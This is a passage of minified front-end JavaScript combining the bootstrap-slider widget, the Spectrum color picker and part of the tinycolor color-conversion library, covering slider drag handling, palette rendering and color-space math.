this._state.keyCtrl,!1}},_pauseEvent:function(t){t.stopPropagation&&t.stopPropagation(),t.preventDefault&&t.preventDefault(),t.cancelBubble=!0,t.returnValue=!1},_mousemove:function(t){if(!this._state.enabled)return!1;var e=this._getPercentage(t);this._adjustPercentageForRangeSliders(e),this._state.percentage[this._state.dragged]=e;var n=this._calculateValue(!0);return this.setValue(n,!0,!0),!1},_touchmove:function(t){void 0!==t.changedTouches&&t.preventDefault&&t.preventDefault()},_adjustPercentageForRangeSliders:function(t){if(this.options.range){var e=this._getNumDigitsAfterDecimalPlace(t);e=e?e-1:0;var n=this._applyToFixedAndParseFloat(t,e);0===this._state.dragged&&this._applyToFixedAndParseFloat(this._state.percentage[1],e)<n?(this._state.percentage[0]=this._state.percentage[1],this._state.dragged=1):1===this._state.dragged&&this._applyToFixedAndParseFloat(this._state.percentage[0],e)>n?(this._state.percentage[1]=this._state.percentage[0],this._state.dragged=0):0===this._state.keyCtrl&&this._toPercentage(this._state.value[1])<t?(this._state.percentage[0]=this._state.percentage[1],this._state.keyCtrl=1,this.handle2.focus()):1===this._state.keyCtrl&&this._toPercentage(this._state.value[0])>t&&(this._state.percentage[1]=this._state.percentage[0],this._state.keyCtrl=0,this.handle1.focus())}},_mouseup:function(t){if(!this._state.enabled)return!1;var e=this._getPercentage(t);this._adjustPercentageForRangeSliders(e),this._state.percentage[this._state.dragged]=e,this.touchCapable&&(document.removeEventListener("touchmove",this.mousemove,!1),document.removeEventListener("touchend",this.mouseup,!1)),document.removeEventListener("mousemove",this.mousemove,!1),document.removeEventListener("mouseup",this.mouseup,!1),this._state.inDrag=!1,!1===this._state.over&&this._hideTooltip();var n=this._calculateValue(!0);return this.setValue(n,!1,!0),this._trigger("slideStop",n),this._state.dragged=null,!1},_setValues:function(t,e){var n=0===t?0:100;this._state.percentage[t]!==n&&(e.data[t]=this._toValue(this._state.percentage[t]),e.data[t]=this._applyPrecision(e.data[t]))},_calculateValue:function(t){var e={};return this.options.range?(e.data=[this.options.min,this.options.max],this._setValues(0,e),this._setValues(1,e),t&&(e.data[0]=this._snapToClosestTick(e.data[0]),e.data[1]=this._snapToClosestTick(e.data[1]))):(e.data=this._toValue(this._state.percentage[0]),e.data=parseFloat(e.data),e.data=this._applyPrecision(e.data),t&&(e.data=this._snapToClosestTick(e.data))),e.data},_snapToClosestTick:function(t){for(var e=[t,1/0],n=0;n<this.options.ticks.length;n++){var i=Math.abs(this.options.ticks[n]-t);i<=e[1]&&(e=[this.options.ticks[n],i])}return e[1]<=this.options.ticks_snap_bounds?e[0]:t},_applyPrecision:function(t){var e=this.options.precision||this._getNumDigitsAfterDecimalPlace(this.options.step);return this._applyToFixedAndParseFloat(t,e)},_getNumDigitsAfterDecimalPlace:function(t){var e=(""+t).match(/(?:\.(\d+))?(?:[eE]([+-]?\d+))?$/);return e?Math.max(0,(e[1]?e[1].length:0)-(e[2]?+e[2]:0)):0},_applyToFixedAndParseFloat:function(t,e){var n=t.toFixed(e);return parseFloat(n)},_getPercentage:function(t){!this.touchCapable||"touchstart"!==t.type&&"touchmove"!==t.type&&"touchend"!==t.type||(t=t.changedTouches[0]);var e=t[this.mousePos]-this._state.offset[this.stylePos];"right"===this.stylePos&&(e=-e);var n=e/this._state.size*100;return n=Math.round(n/this._state.percentage[2])*this._state.percentage[2],this.options.reversed&&(n=100-n),Math.max(0,Math.min(100,n))},_validateInputValue:function(t){if(isNaN(+t)){if(Array.isArray(t))return this._validateArray(t),t;throw new Error(s_formatInvalidInputErrorMsg(t))}return+t},_validateArray:function(t){for(var e=0;e<t.length;e++){var n=t[e];if("number"!=typeof n)throw new Error(s_formatInvalidInputErrorMsg(n))}},_setDataVal:function(t){this.element.setAttribute("data-value",t),this.element.setAttribute("value",t),this.element.value=t},_trigger:function(e,n){n=n||0===n?n:void 0;var i=this.eventToCallbackMap[e];if(i&&i.length)for(var o=0;o<i.length;o++)(0,i[o])(n);t&&this._triggerJQueryEvent(e,n)},_triggerJQueryEvent:function(t,e){var n={type:t,value:e};this.$element.trigger(n),this.$sliderElem.trigger(n)},_unbindJQueryEventHandlers:function(){this.$element.off(),this.$sliderElem.off()},_setText:function(t,e){void 0!==t.textContent?t.textContent=e:void 0!==t.innerText&&(t.innerText=e)},_removeClass:function(t,e){for(var n=e.split(" "),i=t.className,o=0;o<n.length;o++){var r=n[o],s=new RegExp("(?:\\s|^)"+r+"(?:\\s|$)");i=i.replace(s," ")}t.className=i.trim()},_addClass:function(t,e){for(var n=e.split(" "),i=t.className,o=0;o<n.length;o++){var r=n[o];new RegExp("(?:\\s|^)"+r+"(?:\\s|$)").test(i)||(i+=" "+r)}t.className=i.trim()},_offsetLeft:function(t){return t.getBoundingClientRect().left},_offsetRight:function(t){return t.getBoundingClientRect().right},_offsetTop:function(t){for(var e=t.offsetTop;(t=t.offsetParent)&&!isNaN(t.offsetTop);)e+=t.offsetTop,"BODY"!==t.tagName&&(e-=t.scrollTop);return e},_offset:function(t){return{left:this._offsetLeft(t),right:this._offsetRight(t),top:this._offsetTop(t)}},_css:function(e,n,i){if(t)t.style(e,n,i);else{var o=n.replace(/^-ms-/,"ms-").replace(/-([\da-z])/gi,(function(t,e){return e.toUpperCase()}));e.style[o]=i}},_toValue:function(t){return this.options.scale.toValue.apply(this,[t])},_toPercentage:function(t){return this.options.scale.toPercentage.apply(this,[t])},_setTooltipPosition:function(){var t=[this.tooltip,this.tooltip_min,this.tooltip_max];if("vertical"===this.options.orientation){var e,n="left"===(e=this.options.tooltip_position?this.options.tooltip_position:this.options.rtl?"left":"right")?"right":"left";t.forEach(function(t){this._addClass(t,e),t.style[n]="100%"}.bind(this))}else"bottom"===this.options.tooltip_position?t.forEach(function(t){this._addClass(t,"bottom"),t.style.top="22px"}.bind(this)):t.forEach(function(t){this._addClass(t,"top"),t.style.top=-this.tooltip.outerHeight-14+"px"}.bind(this))},_getClosestTickIndex:function(t){for(var e=Math.abs(t-this.options.ticks[0]),n=0,i=0;i<this.options.ticks.length;++i){var o=Math.abs(t-this.options.ticks[i]);o<e&&(e=o,n=i)}return n},_setTickIndex:function(){this.ticksAreValid&&(this._state.tickIndex=[this.options.ticks.indexOf(this._state.value[0]),this.options.ticks.indexOf(this._state.value[1])])}},t&&t.fn&&(t.fn.slider?(windowIsDefined&&window.console.warn("bootstrap-slider.js - WARNING: $.fn.slider namespace is already bound. Use the $.fn.bootstrapSlider namespace instead."),r=i):(t.bridget(n,e),r=n),t.bridget(i,e),t((function(){t("input[data-provide=slider]")[r]()})))}(t),e})),function(t){"use strict";"function"==typeof define&&define.amd?define(["jquery"],t):"object"==typeof exports&&"object"==typeof module?module.exports=t(require("jquery")):t(jQuery)}((function(t,e){"use strict";function n(e,n,i,o){for(var r=[],s=0;s<e.length;s++){var a=e[s];if(a){var l=tinycolor(a),c=l.toHsl().l<.5?"sp-thumb-el sp-thumb-dark":"sp-thumb-el sp-thumb-light";c+=tinycolor.equals(n,a)?" sp-thumb-active":"";var u=l.toString(o.preferredFormat||"rgb"),h=g?"background-color:"+l.toRgbString():"filter:"+l.toFilter();r.push('<span title="'+u+'" data-color="'+l.toRgbString()+'" class="'+c+'"><span class="sp-thumb-inner" style="'+h+';" /></span>')}else{r.push(t("<div />").append(t('<span data-color="" style="background-color:transparent;" class="sp-clear-display"></span>').attr("title",o.noColorSelectedText)).html())}}return"<div class='sp-cf "+i+"'>"+r.join("")+"</div>"}function o(e,n){var i=t.extend({},p,e);return i.callbacks={move:c(i.move,n),change:c(i.change,n),show:c(i.show,n),hide:c(i.hide,n),beforeShow:c(i.beforeShow,n)},i}function r(r,a){function c(){if(U.showPaletteOnly&&(U.showPalette=!0),It.text(U.showPaletteOnly?U.togglePaletteMoreText:U.togglePaletteLessText),U.palette){dt=U.palette.slice(0),pt=t.isArray(dt[0])?dt:[dt],ft={};for(var e=0;e<pt.length;e++)for(var n=0;n<pt[e].length;n++){var i=tinycolor(pt[e][n]).toRgbString();ft[i]=!0}}_t.toggleClass("sp-flat",X),_t.toggleClass("sp-input-disabled",!U.showInput),_t.toggleClass("sp-alpha-enabled",U.showAlpha),_t.toggleClass("sp-clear-enabled",Qt),_t.toggleClass("sp-buttons-disabled",!U.showButtons),_t.toggleClass("sp-palette-buttons-disabled",!U.togglePaletteOnly),_t.toggleClass("sp-palette-disabled",!U.showPalette),_t.toggleClass("sp-palette-only",U.showPaletteOnly),_t.toggleClass("sp-initial-disabled",!U.showInitial),_t.addClass(U.className).addClass(U.containerClassName),H()}function b(){if(Q&&window.localStorage){try{var e=window.localStorage[Q].split(",#");e.length>1&&(delete window.localStorage[Q],t.each(e,(function(t,e){x(e)})))}catch(n){}try{mt=window.localStorage[Q].split(";")}catch(n){}}}function x(e){if(Y){var n=tinycolor(e).toRgbString();if(!ft[n]&&-1===t.inArray(n,mt))for(mt.push(n);mt.length>gt;)mt.shift();if(Q&&window.localStorage)try{window.localStorage[Q]=mt.join(";")}catch(i){}}}function _(){var e=$(),i=t.map(pt,(function(t,i){return n(t,e,"sp-palette-row sp-palette-row-"+i,U)}));b(),mt&&i.push(n(function w(){var t=[];if(U.showPalette)for(var e=0;e<mt.length;e++){var n=tinycolor(mt[e]).toRgbString();ft[n]||t.push(mt[e])}return t.reverse().slice(0,U.maxSelectionSize)}(),e,"sp-palette-row sp-palette-row-selection",U)),Lt.html(i.join(""))}function k(){if(U.showInitial){var t=Vt,e=$();Pt.html(n([t,e],e,"sp-palette-row-initial",U))}}function T(){(nt<=0||et<=0||ot<=0)&&H(),tt=!0,_t.addClass(vt),yt=null,xt.trigger("dragstart.spectrum",[$()])}function C(){tt=!1,_t.removeClass(vt),xt.trigger("dragstop.spectrum",[$()])}function S(){var t=Dt.val();if(null!==t&&""!==t||!Qt){var e=tinycolor(t);e.isValid()?(P(e),R(!0)):Dt.addClass("sp-validation-error")}else P(null),R(!0)}function E(){J?D():j()}function j(){var e=t.Event("beforeShow.spectrum");J?H():(xt.trigger(e,[$()]),!1===G.beforeShow($())||e.isDefaultPrevented()||(function i(){for(var t=0;t<f.length;t++)f[t]&&f[t].hide()}(),J=!0,t(bt).bind("keydown.spectrum",A),t(bt).bind("click.spectrum",M),t(window).bind("resize.spectrum",Z),qt.addClass("sp-active"),_t.removeClass("sp-hidden"),H(),I(),Vt=$(),k(),G.show(Vt),xt.trigger("show.spectrum",[Vt])))}function A(t){27===t.keyCode&&D()}function M(t){2!=t.button&&(tt||(Xt?R(!0):L(),D()))}function D(){J&&!X&&(J=!1,t(bt).unbind("keydown.spectrum",A),t(bt).unbind("click.spectrum",M),t(window).unbind("resize.spectrum",Z),qt.removeClass("sp-active"),_t.addClass("sp-hidden"),G.hide($()),xt.trigger("hide.spectrum",[$()]))}function L(){P(Vt,!0)}function P(t,e){var n,i;tinycolor.equals(t,$())?I():(!t&&Qt?Yt=!0:(Yt=!1,i=(n=tinycolor(t)).toHsv(),lt=i.h%360/360,ct=i.s,ut=i.v,ht=i.a),I(),n&&n.isValid()&&!e&&(Ut=U.preferredFormat||n.getFormat()))}function $(t){return t=t||{},Qt&&Yt?null:tinycolor.fromRatio({h:lt,s:ct,v:ut,a:Math.round(100*ht)/100},{format:t.format||Ut})}function B(){I(),G.move($()),xt.trigger("move.spectrum",[$()])}function I(){Dt.removeClass("sp-validation-error"),N();var t=tinycolor.fromRatio({h:lt,s:1,v:1});Tt.css("background-color",t.toHexString());var e=Ut;ht<1&&(0!==ht||"name"!==e)&&("hex"!==e&&"hex3"!==e&&"hex6"!==e&&"name"!==e||(e="rgb"));var n=$({format:e}),i="";if(Wt.removeClass("sp-clear-display"),Wt.css("background-color","transparent"),!n&&Qt)Wt.addClass("sp-clear-display");else{var o=n.toHexString(),r=n.toRgbString();if(g||1===n.alpha?Wt.css("background-color",r):(Wt.css("background-color","transparent"),Wt.css("filter",n.toFilter())),U.showAlpha){var s=n.toRgb();s.a=0;var a=tinycolor(s).toRgbString(),l="linear-gradient(left, "+a+", "+o+")";m?jt.css("filter",tinycolor(a).toFilter({gradientType:1},o)):(jt.css("background","-webkit-"+l),jt.css("background","-moz-"+l),jt.css("background","-ms-"+l),jt.css("background","linear-gradient(to right, "+a+", "+o+")"))}i=n.toString(e)}U.showInput&&Dt.val(i),U.showPalette&&_(),k()}function N(){var t=ct,e=ut;if(Qt&&Yt)Mt.hide(),Et.hide(),Ct.hide();else{Mt.show(),Et.show(),Ct.show();var n=t*et,i=nt-e*nt;n=Math.max(-it,Math.min(et-it,n-it)),i=Math.max(-it,Math.min(nt-it,i-it)),Ct.css({top:i+"px",left:n+"px"});var o=ht*rt;Mt.css({left:o-st/2+"px"});var r=lt*ot;Et.css({top:r-at+"px"})}}function R(t){var e=$(),n="",i=!tinycolor.equals(e,Vt);e&&(n=e.toString(Ut),x(e)),Nt&&xt.val(n),t&&i&&(G.change(e),xt.trigger("change",[e]))}function H(){J&&(et=Tt.width(),nt=Tt.height(),it=Ct.height(),St.width(),ot=St.height(),at=Et.height(),rt=At.width(),st=Mt.width(),X||(_t.css("position","absolute"),U.offset?_t.offset(U.offset):_t.offset(function s(e,n){var i=0,o=e.outerWidth(),r=e.outerHeight(),s=n.outerHeight(),a=e[0].ownerDocument,l=a.documentElement,c=l.clientWidth+t(a).scrollLeft(),u=l.clientHeight+t(a).scrollTop(),h=n.offset();return h.top+=s,h.left-=Math.min(h.left,h.left+o>c&&c>o?Math.abs(h.left+o-c):0),h.top-=Math.min(h.top,h.top+r>u&&u>r?Math.abs(r+s-i):i),h}(_t,Ft))),N(),U.showPalette&&_(),xt.trigger("reflow.spectrum"))}function z(){D(),wt=!0,xt.attr("disabled",!0),Ft.addClass("sp-disabled")}var U=o(a,r),X=U.flat,Y=U.showSelectionPalette,Q=U.localStorageKey,K=U.theme,G=U.callbacks,Z=function h(t,e,n){var i;return function(){var o=this,r=arguments,s=function(){i=null,t.apply(o,r)};n&&clearTimeout(i),!n&&i||(i=setTimeout(s,e))}}(H,10),J=!1,tt=!1,et=0,nt=0,it=0,ot=0,rt=0,st=0,at=0,lt=0,ct=0,ut=0,ht=1,dt=[],pt=[],ft={},mt=U.selectionPalette.slice(0),gt=U.maxSelectionSize,vt="sp-dragging",yt=null,bt=r.ownerDocument,xt=(bt.body,t(r)),wt=!1,_t=t(y,bt).addClass(K),kt=_t.find(".sp-picker-container"),Tt=_t.find(".sp-color"),Ct=_t.find(".sp-dragger"),St=_t.find(".sp-hue"),Et=_t.find(".sp-slider"),jt=_t.find(".sp-alpha-inner"),At=_t.find(".sp-alpha"),Mt=_t.find(".sp-alpha-handle"),Dt=_t.find(".sp-input"),Lt=_t.find(".sp-palette"),Pt=_t.find(".sp-initial"),$t=_t.find(".sp-cancel"),Ot=_t.find(".sp-clear"),Bt=_t.find(".sp-choose"),It=_t.find(".sp-palette-toggle"),Nt=xt.is("input"),Rt=Nt&&"color"===xt.attr("type")&&d(),Ht=Nt&&!X,qt=Ht?t(v).addClass(K).addClass(U.className).addClass(U.replacerClassName):t([]),Ft=Ht?qt:xt,Wt=qt.find(".sp-preview-inner"),zt=U.color||Nt&&xt.val(),Vt=!1,Ut=U.preferredFormat,Xt=!U.showButtons||U.clickoutFiresChange,Yt=!zt,Qt=U.allowEmpty&&!Rt;!function p(){function e(e){return e.data&&e.data.ignore?(P(t(e.target).closest(".sp-thumb-el").data("color")),B()):(P(t(e.target).closest(".sp-thumb-el").data("color")),B(),R(!0),U.hideAfterPaletteSelect&&D()),!1}if(m&&_t.find("*:not(input)").attr("unselectable","on"),c(),Ht&&xt.after(qt).hide(),Qt||Ot.hide(),X)xt.after(_t).hide();else{var n="parent"===U.appendTo?xt.parent():t(U.appendTo);1!==n.length&&(n=t("body")),n.append(_t)}b(),Ft.bind("click.spectrum touchstart.spectrum",(function(e){wt||E(),e.stopPropagation(),t(e.target).is("input")||e.preventDefault()})),(xt.is(":disabled")||!0===U.disabled)&&z(),_t.click(l),Dt.change(S),Dt.bind("paste",(function(){setTimeout(S,1)})),Dt.keydown((function(t){13==t.keyCode&&S()})),$t.text(U.cancelText),$t.bind("click.spectrum",(function(t){t.stopPropagation(),t.preventDefault(),L(),D()})),Ot.attr("title",U.clearText),Ot.bind("click.spectrum",(function(t){t.stopPropagation(),t.preventDefault(),Yt=!0,B(),X&&R(!0)})),Bt.text(U.chooseText),Bt.bind("click.spectrum",(function(t){t.stopPropagation(),t.preventDefault(),m&&Dt.is(":focus")&&Dt.trigger("change"),function O(){return!Dt.hasClass("sp-validation-error")}()&&(R(!0),D())})),It.text(U.showPaletteOnly?U.togglePaletteMoreText:U.togglePaletteLessText),It.bind("click.spectrum",(function(t){t.stopPropagation(),t.preventDefault(),U.showPaletteOnly=!U.showPaletteOnly,U.showPaletteOnly||X||_t.css("left","-="+(kt.outerWidth(!0)+5)),c()})),u(At,(function(t,e,n){ht=t/rt,Yt=!1,n.shiftKey&&(ht=Math.round(10*ht)/10),B()}),T,C),u(St,(function(t,e){lt=parseFloat(e/ot),Yt=!1,U.showAlpha||(ht=1),B()}),T,C),u(Tt,(function(t,e,n){if(n.shiftKey){if(!yt){var i=ct*et,o=nt-ut*nt,r=Math.abs(t-i)>Math.abs(e-o);yt=r?"x":"y"}}else yt=null;var s=!yt||"y"===yt;(!yt||"x"===yt)&&(ct=parseFloat(t/et)),s&&(ut=parseFloat((nt-e)/nt)),Yt=!1,U.showAlpha||(ht=1),B()}),T,C),zt?(P(zt),I(),Ut=U.preferredFormat||tinycolor(zt).format,x(zt)):I(),X&&j();var i=m?"mousedown.spectrum":"click.spectrum touchstart.spectrum";Lt.delegate(".sp-thumb-el",i,e),Pt.delegate(".sp-thumb-el:nth-child(1)",i,{ignore:!0},e)}();var Kt={show:j,hide:D,toggle:E,reflow:H,option:function F(n,i){return n===e?t.extend({},U):i===e?U[n]:(U[n]=i,"preferredFormat"===n&&(Ut=U.preferredFormat),void c())},enable:function W(){wt=!1,xt.attr("disabled",!1),Ft.removeClass("sp-disabled")},disable:z,offset:function V(t){U.offset=t,H()},set:function(t){P(t),R()},get:$,destroy:function q(){xt.show(),Ft.unbind("click.spectrum touchstart.spectrum"),_t.remove(),qt.remove(),f[Kt.id]=null},container:_t};return Kt.id=f.push(Kt)-1,Kt}function a(){}function l(t){t.stopPropagation()}function c(t,e){var n=Array.prototype.slice,i=n.call(arguments,2);return function(){return t.apply(e,i.concat(n.call(arguments)))}}function u(e,n,i,o){function r(t){t.stopPropagation&&t.stopPropagation(),t.preventDefault&&t.preventDefault(),t.returnValue=!1}function s(t){if(u){if(m&&c.documentMode<9&&!t.button)return l();var i=t.originalEvent&&t.originalEvent.touches&&t.originalEvent.touches[0],o=i&&i.pageX||t.pageX,s=i&&i.pageY||t.pageY,a=Math.max(0,Math.min(o-h.left,p)),g=Math.max(0,Math.min(s-h.top,d));f&&r(t),n.apply(e,[a,g,t])}}function l(){u&&(t(c).unbind(g),t(c.body).removeClass("sp-dragging"),setTimeout((function(){o.apply(e,arguments)}),0)),u=!1}n=n||function(){},i=i||function(){},o=o||function(){};var c=document,u=!1,h={},d=0,p=0,f="ontouchstart"in window,g={};g.selectstart=r,g.dragstart=r,g["touchmove mousemove"]=s,g["touchend mouseup"]=l,t(e).bind("touchstart mousedown",(function a(n){(n.which?3==n.which:2==n.button)||u||!1!==i.apply(e,arguments)&&(u=!0,d=t(e).height(),p=t(e).width(),h=t(e).offset(),t(c).bind(g),t(c.body).addClass("sp-dragging"),s(n),r(n))}))}function d(){return t.fn.spectrum.inputTypeColorSupport()}var p={beforeShow:a,move:a,change:a,show:a,hide:a,color:!1,flat:!1,showInput:!1,allowEmpty:!1,showButtons:!0,clickoutFiresChange:!0,showInitial:!1,showPalette:!1,showPaletteOnly:!1,hideAfterPaletteSelect:!1,togglePaletteOnly:!1,showSelectionPalette:!0,localStorageKey:!1,appendTo:"body",maxSelectionSize:7,cancelText:"cancel",chooseText:"choose",togglePaletteMoreText:"more",togglePaletteLessText:"less",clearText:"Clear Color Selection",noColorSelectedText:"No Color Selected",preferredFormat:!1,className:"",containerClassName:"",replacerClassName:"",showAlpha:!1,theme:"sp-light",palette:[["#ffffff","#000000","#ff0000","#ff8000","#ffff00","#008000","#0000ff","#4b0082","#9400d3"]],selectionPalette:[],disabled:!1,offset:null},f=[],m=!!/msie/i.exec(window.navigator.userAgent),g=function(){function t(t,e){return!!~(""+t).indexOf(e)}var e=document.createElement("div").style;return e.cssText="background-color:rgba(0,0,0,.5)",t(e.backgroundColor,"rgba")||t(e.backgroundColor,"hsla")}(),v=["<div class='sp-replacer'>","<div class='sp-preview'><div class='sp-preview-inner'></div></div>","<div class='sp-dd'>&#9660;</div>","</div>"].join(""),y=function(){var t="";if(m)for(var e=1;e<=6;e++)t+="<div class='sp-"+e+"'></div>";return["<div class='sp-container sp-hidden'>","<div class='sp-palette-container'>","<div class='sp-palette sp-thumb sp-cf'></div>","<div class='sp-palette-button-container sp-cf'>","<button type='button' class='sp-palette-toggle'></button>","</div>","</div>","<div class='sp-picker-container'>","<div class='sp-top sp-cf'>","<div class='sp-fill'></div>","<div class='sp-top-inner'>","<div class='sp-color'>","<div class='sp-sat'>","<div class='sp-val'>","<div class='sp-dragger'></div>","</div>","</div>","</div>","<div class='sp-clear sp-clear-display'>","</div>","<div class='sp-hue'>","<div class='sp-slider'></div>",t,"</div>","</div>","<div class='sp-alpha'><div class='sp-alpha-inner'><div class='sp-alpha-handle'></div></div></div>","</div>","<div class='sp-input-container sp-cf'>","<input class='sp-input' type='text' spellcheck='false'  />","</div>","<div class='sp-initial sp-thumb sp-cf'></div>","<div class='sp-button-container sp-cf'>","<a class='sp-cancel' href='#'></a>","<button type='button' class='sp-choose'></button>","</div>","</div>","</div>"].join("")}(),b="spectrum.id";t.fn.spectrum=function(e){if("string"==typeof e){var n=this,i=Array.prototype.slice.call(arguments,1);return this.each((function(){var o=f[t(this).data(b)];if(o){var r=o[e];if(!r)throw new Error("Spectrum: no such method: '"+e+"'");"get"==e?n=o.get():"container"==e?n=o.container:"option"==e?n=o.option.apply(o,i):"destroy"==e?(o.destroy(),t(this).removeData(b)):r.apply(o,i)}})),n}return this.spectrum("destroy").each((function(){var n=r(this,t.extend({},e,t(this).data()));t(this).data(b,n.id)}))},t.fn.spectrum.load=!0,t.fn.spectrum.loadOpts={},t.fn.spectrum.draggable=u,t.fn.spectrum.defaults=p,t.fn.spectrum.inputTypeColorSupport=function x(){if(void 0===x._cachedResult){var e=t("<input type='color'/>")[0];x._cachedResult="color"===e.type&&""!==e.value}return x._cachedResult},t.spectrum={},t.spectrum.localization={},t.spectrum.palettes={},t.fn.spectrum.processNativeColorInputs=function(){var e=t("input[type=color]");e.length&&!d()&&e.spectrum({preferredFormat:"hex6"})},function(){function t(t){var n={r:0,g:0,b:0},o=1,s=!1,a=!1;return"string"==typeof t&&(t=function L(t){t=t.replace(P,"").replace($,"").toLowerCase();var e,n=!1;if(V[t])t=V[t],n=!0;else if("transparent"==t)return{r:0,g:0,b:0,a:0,format:"name"};return(e=X.rgb.exec(t))?{r:e[1],g:e[2],b:e[3]}:(e=X.rgba.exec(t))?{r:e[1],g:e[2],b:e[3],a:e[4]}:(e=X.hsl.exec(t))?{h:e[1],s:e[2],l:e[3]}:(e=X.hsla.exec(t))?{h:e[1],s:e[2],l:e[3],a:e[4]}:(e=X.hsv.exec(t))?{h:e[1],s:e[2],v:e[3]}:(e=X.hsva.exec(t))?{h:e[1],s:e[2],v:e[3],a:e[4]}:(e=X.hex8.exec(t))?{a:D(e[1]),r:C(e[2]),g:C(e[3]),b:C(e[4]),format:n?"name":"hex8"}:(e=X.hex6.exec(t))?{r:C(e[1]),g:C(e[2]),b:C(e[3]),format:n?"name":"hex"}:!!(e=X.hex3.exec(t))&&{r:C(e[1]+""+e[1]),g:C(e[2]+""+e[2]),b:C(e[3]+""+e[3]),format:n?"name":"hex"}}(t)),"object"==typeof t&&(t.hasOwnProperty("r")&&t.hasOwnProperty("g")&&t.hasOwnProperty("b")?(n=function e(t,e,n){return{r:255*k(t,255),g:255*k(e,255),b:255*k(n,255)}}(t.r,t.g,t.b),s=!0,a="%"===String(t.r).substr(-1)?"prgb":"rgb"):t.hasOwnProperty("h")&&t.hasOwnProperty("s")&&t.hasOwnProperty("v")?(t.s=A(t.s),t.v=A(t.v),n=function r(t,e,n){t=6*k(t,360),e=k(e,100),n=k(n,100);var i=B.floor(t),o=t-i,r=n*(1-e),s=n*(1-o*e),a=n*(1-(1-o)*e),l=i%6;return{r:255*[n,s,r,r,a,n][l],g:255*[a,n,n,s,r,r][l],b:255*[r,r,a,n,n,s][l]}}(t.h,t.s,t.v),s=!0,a="hsv"):t.hasOwnProperty("h")&&t.hasOwnProperty("s")&&t.hasOwnProperty("l")&&(t.s=A(t.s),t.l=A(t.l),n=function i(t,e,n){function i(t,e,n){return n<0&&(n+=1),n>1&&(n-=1),n<1/6?t+6*(e-t)*n:n<.5?e:n<2/3?t+(e-t)*(2/3-n)*6:t}var o,r,s;if(t=k(t,360),e=k(e,100),n=k(n,100),0===e)o=r=s=n;else{var a=n<.5?n*(1+e):n+e-n*e,l=2*n-a;o=i(l,a,t+1/3),r=i(l,a,t),s=i(l,a,t-1/3)}return{r:255*o,g:255*r,b:255*s}}(t.h,t.s,t.l),s=!0,a="hsl"),t.hasOwnProperty("a")&&(o=t.a)),o=_(o),{ok:s,format:t.format||a,r:N(255,R(n.r,0)),g:N(255,R(n.g,0)),b:N(255,R(n.b,0)),a:o}}function n(t,e,n){t=k(t,255),e=k(e,255),n=k(n,255);var i,o,r=R(t,e,n),s=N(t,e,n),a=(r+s)/2;if(r==s)i=o=0;else{var l=r-s;switch(o=a>.5?l/(2-r-s):l/(r+s),r){case t:i=(e-n)/l+(e<n?6:0);break;case e:i=(n-t)/l+2;break;case n:i=(t-e)/l+4}i/=6}return{h:i,s:o,l:a}}function o(t,e,n){t=k(t,255),e=k(e,255),n=k(n,255);var i,o,r=R(t,e,n),s=N(t,e,n),a=r,l=r-s;if(o=0===r?0:l/r,r==s)i=0;else{switch(r){case t:i=(e-n)/l+(e<n?6:0);break;case e:i=(n-t)/l+2;break;case n:i=(t-e)/l+4}i/=6}return{h:i,s:o,v:a}}function s(t,e,n,i){var o=[j(I(t).toString(16)),j(I(e).toString(16)),j(I(n).toString(16))];return i&&o[0].charAt(0)==o[0].charAt(1)&&o[1].charAt(0)==o[1].charAt(1)&&o[2].charAt(0)==o[2].charAt(1)?o[0].charAt(0)+o[1].charAt(0)+o[2].charAt(0):o.join("")}function a(t,e,n,i){return[j(M(i)),j(I(t).toString(16)),j(I(e).toString(16)),j(I(n).toString(16))].join("")}function l(t,e){e=0===e?0:e||10;var n=q(t).toHsl();return n.s-=e/100,n.s=T(n.s),q(n)}function c(t,e){e=0===e?0:e||10;var n=q(t).toHsl();return n.s+=e/100,n.s=T(n.s),q(n)}function u(t){return q(t).desaturate(100)}function h(t,e){e=0===e?0:e||10;var n=q(t).toHsl();return n.l+=e/100,n.l=T(n.l),q(n)}function d(t,e){e=0===e?0:e||10;var n=q(t).toRgb();return n.r=R(0,N(255,n.r-I(-e/100*255))),n.g=R(0,N(255,n.g-I(-e/100*255))),n.b=R(0,N(255,n.b-I(-e/100*255))),q(n)}function p(t,e){e=0===e?0:e||10;var n=q(t).toHsl();return n.l-=e/100,n.l=T(n.l),q(n)}function f(t,e){var n=q(t).toHsl(),i=(I(n.h)+e)%360;return n.h=i<0?360+i:i,q(n)}function m(t){var e=q(t).toHsl();return e.h=(e.h+180)%360,q(e)}function g(t){var e=q(t).toHsl(),n=e.h;return[q(t),q({h:(n+120)%360,s:e.s,l:e.l}),q({h:(n+240)%360,s:e.s,l:e.l})]}function v(t){var e=q(t).toHsl(),n=e.h;return[q(t),q({h:(n+90)%360,s:e.s,l:e.l}),q({h:(n+180)%360,s:e.s,l:e.l}),q({h:(n+270)%360,s:e.s,l:e.l})]}function y(t){var e=q(t).toHsl(),n=e.h;return[q(t),q({h:(n+72)%360,s:e.s,l:e.l}),q({h:(n+216)%360,s:e.s,l:e.l})]}function b(t,e,n){e=e||6,n=n||30;var i=q(t).toHsl(),o=360/n,r=[q(t)];for(i.h=(i.h-(o*e>>1)+720)%360;--e;)i.h=(i.h+o)%360,r.push(q(i));return r}function x(t,e){e=e||6;for(var n=q(t).toHsv(),i=n.h,o=n.s,r=n.v,s=[],a=1/e;e--;)s.push(q({h:i,s:o,v:r})),r=(r+a)%1;return s}function _(t){return t=parseFloat(t),(isNaN(t)||t<0||t>1)&&(t=1),t}function k(t,e){(function S(t){return"string"==typeof t&&-1!=t.indexOf(".")&&1===parseFloat(t)})(t)&&(t="100%");var n=function E(t){return"string"==typeof t&&-1!=t.indexOf("%")}(t);return t=N(e,R(0,parseFloat(t))),n&&(t=parseInt(t*e,10)/100),B.abs(t-e)<1e-6?1:t%e/parseFloat(e)}function T(t){return N(1,R(0,t))}function C(t){return parseInt(t,16)}function j(t){return 1==t.length?"0"+t:""+t}function A(t){return t<=1&&(t=100*t+"%"),t}function M(t){return Math.round(255*parseFloat(t)).toString(16)}function D(t){return C(t)/255}var P=/^[\s,#]+/,$=/\s+$/,O=0,B=Math,I=B.round,N=B.min,R=B.max,H=B.random,q=function(e,n){if(n=n||{},(e=e||"")instanceof q)return e;if(!(this instanceof q))return new q(e,n);var i=t(e);this._originalInput=e,this._r=i.r,this._g=i.g,this._b=i.b,this._a=i.a,this._roundA=I(100*this._a)/100,this._format=n.format||i.format,this._gradientType=n.gradientType,this._r<1&&(this._r=I(this._r)),this._g<1&&(this._g=I(this._g)),this._b<1&&(this._b=I(this._b)),this._ok=i.ok,this._tc_id=O++};q.prototype={isDark:function(){return this.getBrightness()<128},isLight:function(){return!this.isDark()},isValid:function(){return 